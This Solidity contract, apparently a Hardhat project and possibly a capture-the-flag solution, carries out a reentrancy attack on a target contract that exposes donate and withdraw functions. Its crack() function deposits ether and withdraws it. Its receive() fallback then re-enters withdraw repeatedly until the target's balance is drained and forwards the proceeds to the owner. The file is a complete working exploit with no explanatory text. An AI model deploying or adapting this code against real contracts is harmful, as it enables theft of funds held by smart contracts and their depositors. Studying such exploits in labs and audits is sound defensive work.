// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// Uncomment this line to use console.log
import "hardhat/console.sol";

interface RentrancyI {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract ReentrancyV2 {
    address payable public owner;
    RentrancyI targetContractI;

    constructor(address targetContract) payable {
        owner = payable(msg.sender);
        targetContractI = RentrancyI(targetContract);
    }

    function crack() public payable {
        require(msg.sender == owner, "You aren't the owner");
        console.log("Aca");
        targetContractI.donate{value: msg.value, gas: gasleft()}(address(this));
        targetContractI.withdraw(msg.value);
    }

    receive() external payable {
        uint256 balance = address(targetContractI).balance;
        if (balance != 0) {
            if (msg.value <= balance) {
                targetContractI.withdraw(msg.value);
            } else {
                targetContractI.withdraw(balance);
            }
        } else {
            owner.transfer(address(this).balance);
        }
    }
}
